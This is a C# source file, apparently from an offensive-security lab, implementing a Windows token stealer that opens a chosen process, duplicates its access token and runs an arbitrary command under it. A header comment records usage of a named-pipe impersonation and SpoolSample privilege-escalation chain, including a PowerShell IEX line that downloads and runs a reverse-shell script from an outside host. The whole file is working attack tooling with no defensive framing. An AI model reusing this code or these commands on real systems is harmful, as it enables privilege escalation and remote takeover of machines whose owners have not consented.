/*
As  "NT AUTHORITY\Network Service"
pipi3.exe \\.\pipe\test\pipe\spoolss
pipi2.exe \\.\pipe\test\pipe\spoolss "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.49.71/rev-slim.txt')"


SpoolSample.exe appsrv01 appsrv01/pipe/test
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace pipi
{
    class Program
    {
        public enum CreationFlags { DefaultErrorMode = 0x04000000, NewConsole = 0x00000010, NewProcessGroup = 0x00000200, SeparateWOWVDM = 0x00000800, Suspended = 0x00000004, UnicodeEnvironment = 0x00000400, ExtendedStartupInfoPresent = 0x00080000 }
        public enum LogonFlags { WithProfile = 1, NetCredentialsOnly }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES { public IntPtr Sid; public int Attributes; }
        public struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO { public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }



        // defs

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        private static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private static uint STANDARD_RIGHTS_READ = 0x00020000;
        private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static uint TOKEN_DUPLICATE = 0x0002;
        private static uint TOKEN_IMPERSONATE = 0x0004;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_QUERY_SOURCE = 0x0010;
        private static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private static uint TOKEN_ADJUST_GROUPS = 0x0040;
        private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: token_stealer.exe process_id command_to_execute");
                return;
            }
            int pid = Int32.Parse(args[0]);
            string command = args[1];
            IntPtr tokenHandle;

            IntPtr proc_handle = OpenProcess(0x001F0FFF, false, pid);
            OpenProcessToken(proc_handle, TOKEN_READ, out tokenHandle);


            int TokenInfLength = 0;
            GetTokenInformation(tokenHandle, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(tokenHandle, 1, TokenInformation, TokenInfLength, out TokenInfLength);
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(tokenHandle, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
            Console.WriteLine("token duplicated" );


            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256); IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";
            Console.WriteLine("Starting command");
            if (CreateProcessWithTokenW(hSystemToken, (uint) LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c " + command, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi))
            {
                Console.WriteLine("create process success");
            }
            else { Console.WriteLine("create process failed"); }
                //CreateProcessWithTokenW(tokenHandle, 0, null, "C:\\Windows\\System32\\cmd.exe /c " + command, 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}
